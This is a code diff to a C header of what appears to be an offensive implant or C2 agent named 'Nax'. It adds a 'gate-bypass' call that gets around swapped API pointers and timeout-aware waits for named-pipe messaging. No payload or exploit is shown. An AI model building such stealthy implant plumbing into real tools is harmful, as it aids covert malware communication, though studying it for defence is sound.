@@ -8,6 +8,31 @@
 #pragma once
 #include "Nax.h"
 
+/* ========= [ NaxPipeWfso - gate-bypass WaitForSingleObject ] ========= */
+
+FUNC static DWORD NaxPipeWfso( PNAX_INSTANCE Nax, HANDLE h, DWORD ms ) {
+    typedef DWORD (WINAPI *FN_WFSO)( HANDLE, DWORD );
+    FN_WFSO fn = (FN_WFSO)Nax->Kernel32.WaitForSingleObject;
+    for ( UINT32 i = 0; i < Nax->GateSwaps.Count; i++ ) {
+        if ( Nax->GateSwaps.Entries[i].Slot == (PVOID*)&Nax->Kernel32.WaitForSingleObject ) {
+            fn = (FN_WFSO)Nax->GateSwaps.Entries[i].Original;
+            break;
+        }
+    }
+    return fn( h, ms );
+}
+
+/* ========= [ NaxPipeWaitOv - timeout-aware overlapped wait ] ========= */
+
+FUNC static BOOL NaxPipeWaitOv( PNAX_INSTANCE Nax, HANDLE hPipe, OVERLAPPED* ov, DWORD* transferred ) {
+    DWORD w = NaxPipeWfso( Nax, ov->hEvent, NAX_PIPE_IO_TIMEOUT_MS );
+    if ( w != WAIT_OBJECT_0 ) {
+        Nax->Kernel32.CancelIo( hPipe );
+        return FALSE;
+    }
+    return Nax->Kernel32.GetOverlappedResult( hPipe, ov, transferred, FALSE );
+}
+
 /* ========= [ NaxPipeWrite - write length-prefixed message in chunks ] ========= */
 
 FUNC static BOOL NaxPipeWrite( PNAX_INSTANCE Nax, HANDLE hPipe, HANDLE hEvent, const PBYTE data, UINT32 size ) {
@@ -18,9 +43,10 @@ FUNC static BOOL NaxPipeWrite( PNAX_INSTANCE Nax, HANDLE hPipe, HANDLE hEvent, c
 
     Nax->Kernel32.ResetEvent( hEvent );
     if ( ! Nax->Kernel32.WriteFile( hPipe, &size, 4, &written, &ov ) ) {
-        if ( Nax->Kernel32.GetLastError() == ERROR_IO_PENDING )
-            Nax->Kernel32.GetOverlappedResult( hPipe, &ov, &written, TRUE );
-        else
+        if ( Nax->Kernel32.GetLastError() == ERROR_IO_PENDING ) {
+            if ( ! NaxPipeWaitOv( Nax, hPipe, &ov, &written ) )
+                return FALSE;
+        } else
             return FALSE;
     }
 
@@ -32,9 +58,10 @@ FUNC static BOOL NaxPipeWrite( PNAX_INSTANCE Nax, HANDLE hPipe, HANDLE hEvent, c
         written   = 0;
         Nax->Kernel32.ResetEvent( hEvent );
         if ( ! Nax->Kernel32.WriteFile( hPipe, data + idx, chunk, &written, &ov ) ) {
-            if ( Nax->Kernel32.GetLastError() == ERROR_IO_PENDING )
-                Nax->Kernel32.GetOverlappedResult( hPipe, &ov, &written, TRUE );
-            else
+            if ( Nax->Kernel32.GetLastError() == ERROR_IO_PENDING ) {
+                if ( ! NaxPipeWaitOv( Nax, hPipe, &ov, &written ) )
+                    return FALSE;
+            } else
                 return FALSE;
         }
         idx += written;
@@ -53,9 +80,10 @@ FUNC static BOOL NaxPipeRead( PNAX_INSTANCE Nax, HANDLE hPipe, HANDLE hEvent, PB
         DWORD nRead = 0;
         Nax->Kernel32.ResetEvent( hEvent );
         if ( ! Nax->Kernel32.ReadFile( hPipe, buf + idx, size - idx, &nRead, &ov ) ) {
-            if ( Nax->Kernel32.GetLastError() == ERROR_IO_PENDING )
-                Nax->Kernel32.GetOverlappedResult( hPipe, &ov, &nRead, TRUE );
-            else
+            if ( Nax->Kernel32.GetLastError() == ERROR_IO_PENDING ) {
+                if ( ! NaxPipeWaitOv( Nax, hPipe, &ov, &nRead ) )
+                    return FALSE;
+            } else
                 return FALSE;
         }
         idx += nRead;
